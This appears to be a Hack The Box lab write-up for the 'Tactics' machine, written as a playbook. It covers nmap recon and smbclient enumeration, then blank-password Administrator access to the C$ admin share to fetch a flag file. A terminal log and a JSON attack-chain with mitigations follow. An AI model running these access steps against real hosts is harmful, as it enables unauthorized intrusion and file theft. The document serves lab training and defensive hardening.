# HTB Tactics - SMB Misconfiguration Access Playbook

Scope: authorized HTB lab only.
Focus: SMB share misconfiguration leading to high-privilege file access.

---

## 1. Investigation Objective

1. Identify Windows service exposure.
2. Enumerate SMB shares.
3. Validate whether admin shares are accessible with weak/blank auth.
4. Retrieve sensitive artifact and assess impact.

---

## 2. Network Recon

```bash
nmap -sC -sV -Pn -v <TARGET_IP>
```

Expected service profile:
- `135/tcp` MSRPC
- `139/tcp` NetBIOS
- `445/tcp` SMB

Interpretation:
- SMB on 445 is primary attack surface.

---

## 3. SMB Share Enumeration

List shares with Administrator context and empty password trial:

```bash
smbclient -L //<TARGET_IP> -U Administrator
```

When prompted for password, test blank entry in lab context.

Observed notable shares:
- `C$`
- `ADMIN$`

These are hidden administrative shares and should not be anonymously/weakly accessible.

---

## 4. Share Access and Artifact Retrieval

Connect to C$:

```bash
smbclient //<TARGET_IP>/C$ -U Administrator
```

Inside session:

```text
cd Users
cd Administrator
cd Desktop
ls
get flag.txt
```

---

## 5. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn -v 10.129.X.X
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows SMB

analyst@kali:~$ smbclient -L //10.129.X.X -U Administrator
Password for [WORKGROUP\Administrator]:

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC

analyst@kali:~$ smbclient //10.129.X.X/C$ -U Administrator
Password for [WORKGROUP\Administrator]:
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> ls
	flag.txt            A       34
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 34 as flag.txt
```

---

## 6. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "tactics_admin_smb_share_exposure",
	"input_signals": [
		"Windows RPC/SMB ports exposed",
		"Administrative shares listed via smbclient",
		"Administrator share access succeeded with weak/blank auth",
		"Sensitive desktop artifact retrieved from C$"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Network Service Discovery",
			"confidence": 0.95,
			"evidence": "nmap identified SMB stack"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "Valid Accounts / Weak Authentication",
			"confidence": 0.89,
			"evidence": "smbclient listed and accessed admin shares"
		},
		{
			"step": 3,
			"tactic": "collection",
			"technique": "Data from Information Repositories",
			"confidence": 0.92,
			"evidence": "flag.txt downloaded from Administrator desktop"
		}
	],
	"hypotheses": [
		"Same weak authentication posture may affect WinRM/RDP services",
		"Additional sensitive artifacts likely exist in user profile directories",
		"Remote command execution paths may be feasible with recovered auth context"
	],
	"uncertainties": [
		"Unknown whether blank password is allowed universally or only in challenge setup",
		"Group policy hardening status not evaluated",
		"No evidence yet of SMB signing enforcement"
	],
	"tool_calls": [
		{"name": "smb_share_acl_auditor", "priority": "high"},
		{"name": "admin_share_exposure_checker", "priority": "high"},
		{"name": "windows_auth_policy_mapper", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Disable blank or weak local administrator authentication",
			"Restrict administrative shares to trusted management hosts",
			"Rotate local admin credentials and apply LAPS-like controls"
		],
		"hardening": [
			"Enforce SMB signing and hardened NTLM policy",
			"Disable unnecessary legacy file-sharing exposure",
			"Apply least privilege and network segmentation for admin protocols"
		],
		"monitoring": [
			"Alert on remote access to ADMIN$ and C$ from non-admin hosts",
			"Track repeated SMB authentication attempts against privileged accounts",
			"Monitor sensitive file downloads from admin profile paths"
		]
	}
}
```